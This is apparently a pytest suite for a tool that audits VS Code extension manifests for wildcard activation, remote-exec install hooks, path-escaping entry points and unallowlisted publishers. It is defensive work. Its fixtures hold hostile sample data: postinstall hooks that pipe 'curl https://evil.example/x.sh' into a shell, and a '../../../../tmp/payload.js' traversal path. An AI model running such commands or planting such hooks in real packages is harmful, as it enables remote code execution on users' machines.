"""Tests for installed IDE extension manifest auditing."""

from pathlib import Path

from click.testing import CliRunner

from skillseraph.checks.extensions import check_extension_manifest, check_unknown_publisher
from skillseraph.cli import main
from skillseraph.local_audit import audit_local_ide_configs
from skillseraph.models import Platform, Severity

EXT_MANIFEST = Path(".vscode/extensions/some-ext-1.0.0/package.json")


class TestExtensionManifestCheck:
    def test_detects_wildcard_activation(self):
        content = '{"name": "helper", "activationEvents": ["*"]}'
        findings = check_extension_manifest(EXT_MANIFEST, content)
        assert any(f.check == "ext_wildcard_activation" for f in findings)

    def test_detects_lifecycle_hook_execution(self):
        content = (
            '{"name": "helper", "scripts": '
            '{"postinstall": "curl https://evil.example/x.sh | bash"}}'
        )
        findings = check_extension_manifest(EXT_MANIFEST, content)
        assert any(f.check == "ext_lifecycle_remote_exec" for f in findings)

    def test_detects_main_outside_extension_dir(self):
        content = '{"name": "helper", "main": "../../../../tmp/payload.js"}'
        findings = check_extension_manifest(EXT_MANIFEST, content)
        assert any(f.check == "ext_main_path_escape" for f in findings)

    def test_benign_manifest_no_findings(self):
        content = (
            '{"name": "prettier", "main": "./out/extension.js", '
            '"activationEvents": ["onLanguage:python"]}'
        )
        findings = check_extension_manifest(EXT_MANIFEST, content)
        assert findings == []

    def test_non_extension_package_json_skipped(self):
        content = '{"name": "webapp", "activationEvents": ["*"]}'
        findings = check_extension_manifest(Path("package.json"), content)
        assert findings == []


class TestUnknownPublisher:
    def test_flags_extension_when_publisher_not_allowlisted(self):
        content = '{"name": "helper", "publisher": "totally-legit-co"}'
        findings = check_unknown_publisher(
            EXT_MANIFEST, content, allowed_publishers={"microsoft", "ms-python"}
        )
        assert any(f.check == "ext_unknown_publisher" for f in findings)
        assert all(f.severity == Severity.INFO for f in findings)

    def test_allowlisted_publisher_not_flagged(self):
        content = '{"name": "python", "publisher": "ms-python"}'
        findings = check_unknown_publisher(
            EXT_MANIFEST, content, allowed_publishers={"microsoft", "ms-python"}
        )
        assert findings == []

    def test_publisher_match_is_case_insensitive(self):
        content = '{"name": "python", "publisher": "MS-Python"}'
        findings = check_unknown_publisher(
            EXT_MANIFEST, content, allowed_publishers={"ms-python"}
        )
        assert findings == []

    def test_no_allowlist_means_no_publisher_findings(self):
        content = '{"name": "helper", "publisher": "anyone"}'
        findings = check_unknown_publisher(EXT_MANIFEST, content, allowed_publishers=set())
        assert findings == []

    def test_non_extension_path_skipped(self):
        content = '{"name": "webapp", "publisher": "anyone"}'
        findings = check_unknown_publisher(
            Path("package.json"), content, allowed_publishers={"microsoft"}
        )
        assert findings == []


class TestUnknownPublisherCli:
    def _fixture(self, tmp_path: Path, publisher: str) -> Path:
        manifest = tmp_path / ".vscode" / "extensions" / f"{publisher}.ext-1.0.0" / "package.json"
        manifest.parent.mkdir(parents=True)
        manifest.write_text(f'{{"name": "ext", "publisher": "{publisher}"}}')
        return tmp_path

    def test_allow_extension_publisher_suppresses_known(self, tmp_path: Path):
        home = self._fixture(tmp_path, "trusted-co")
        result = CliRunner().invoke(
            main,
            [
                "audit-local",
                "--home", str(home),
                "--fail-on", "none",
                "--allow-extension-publisher", "trusted-co",
            ],
        )
        assert result.exit_code == 0
        assert "ext_unknown_publisher" not in result.output

    def test_unlisted_publisher_flagged_when_allowlist_present(self, tmp_path: Path):
        home = self._fixture(tmp_path, "sketchy-co")
        result = CliRunner().invoke(
            main,
            [
                "audit-local",
                "--home", str(home),
                "--fail-on", "none",
                "--allow-extension-publisher", "trusted-co",
            ],
        )
        assert result.exit_code == 0
        assert "ext_unknown_publisher" in result.output


class TestLocalAuditExtensions:
    def test_audit_local_scans_installed_extension_manifests(self, tmp_path: Path):
        manifest = tmp_path / ".vscode" / "extensions" / "evil-ext-0.0.1" / "package.json"
        manifest.parent.mkdir(parents=True)
        manifest.write_text(
            '{"name": "evil-ext", "activationEvents": ["*"], '
            '"scripts": {"postinstall": "curl https://evil.example/x.sh | sh"}}'
        )

        result = audit_local_ide_configs(home=tmp_path)

        assert result.files_scanned == 1
        assert Platform.VSCODE in result.platforms_detected
        checks = {f.check for f in result.findings}
        assert "ext_wildcard_activation" in checks
        assert "ext_lifecycle_remote_exec" in checks
